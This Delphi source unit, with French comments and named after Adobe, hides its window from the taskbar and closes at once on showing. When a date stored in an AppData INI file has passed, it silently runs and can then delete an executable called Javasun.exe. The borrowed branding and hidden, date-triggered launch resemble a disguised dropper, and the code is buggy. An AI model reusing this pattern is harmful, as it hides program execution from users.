Unit Adobe_u;

Interface

Uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Shellapi, IniFiles, Shlobj, Registry,
  Vcl.StdCtrls;

Type
  TAdobe_ = Class(TForm)
    Procedure FormCreate(Sender: TObject);
    Procedure FormShow(Sender: TObject);
    Procedure FormDestroy(Sender: TObject);

  Protected
    Procedure CreateParams(Var Params: TCreateParams); Override;
  Private
    { D�clarations priv�es }
  Public
    { D�clarations publiques }
  End;

Var
  Adobe_: TAdobe_;

Implementation

{$R *.dfm}

Uses
  U_Sys;
{ ............................................................................ }

// Comment masquer une application de la barre des t�ches dans Windows 7?
Procedure TAdobe_.CreateParams(Var Params: TCreateParams);
Begin
  Inherited;
  Params.ExStyle := Params.ExStyle And Not WS_EX_APPWINDOW;
  Params.WndParent := Application.Handle;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Function Ifnidir: Boolean;
Begin
  Inidir := Getspecialfolderpath(Csidl_appdata) + '\Softrasun\Parametres.sav';
  Javasundir := Getspecialfolderpath(Csidl_appdata) + '\Softrasun\Javasun.exe';

  If Not Directoryexists(Getspecialfolderpath(Csidl_appdata) + '\Softrasun')
  Then
    If Not Createdir(Getspecialfolderpath(Csidl_appdata) + '\Softrasun')
    Then Raise Exception.Create
        ('Impossible de cr�er un calcule pour ce compte');

  // IniDir := 'd:\Parametres.sav';
  If FileExists(Inidir)
  Then
  Begin
    Inific := TIniFile.Create(IniDir);
    Try
      If Inific.ReadBool('Param�tres', 'fsChkActiver', False) = True
      Then
      Begin
        If Date > FloatToDateTime(StrToFloat(Inific.ReadString('Param�tres',
          'fsdtkActiver', '')))
        Then Result := True
        Else Result := False;
      End;
    Finally
      //
    End;
  End;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure TAdobe_.FormCreate(Sender: TObject);
Var
  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
Begin
  ZeroMemory(@StartupInfo, SizeOf(StartupInfo));
  StartupInfo.Cb := SizeOf(StartupInfo);
  Try
    If Ifnidir = True
    Then
    Begin
      // Shellexecute(0, 'open', Pchar(Javasundir), Nil, Nil, SW_NORMAL);
      If CreateProcess(Nil, PChar(Javasundir), Nil, Nil, FALSE, 0, Nil, Nil,
        StartupInfo, ProcessInfo)
      Then
      Begin
        Repeat Application.ProcessMessages;
        Until WaitForSingleObject(ProcessInfo.HProcess, 200) <> WAIT_TIMEOUT;
        // CloseHandle(ProcessInfo.hProcess);
        CloseHandle(ProcessInfo.HThread);
        // ShowMessage('Termin�');
        If Inific.ReadBool('Param�tres', 'fsBuild', False) = True
        Then DeleteFile(Javasundir);

      End Else Begin
        // RaiseLastOSError ;
        Inific.WriteBool('Param�tres', 'fsBuild', False)
      End;
    End;
  Finally
  End;
  Exit;
End;

Procedure TAdobe_.FormDestroy(Sender: TObject);
Begin
  Inific.Free;
End; { ... }

{ ............................................................................ }
Procedure TAdobe_.FormShow(Sender: TObject);
Begin
  Close;
End; { _______________________________________________________________________ }

End.
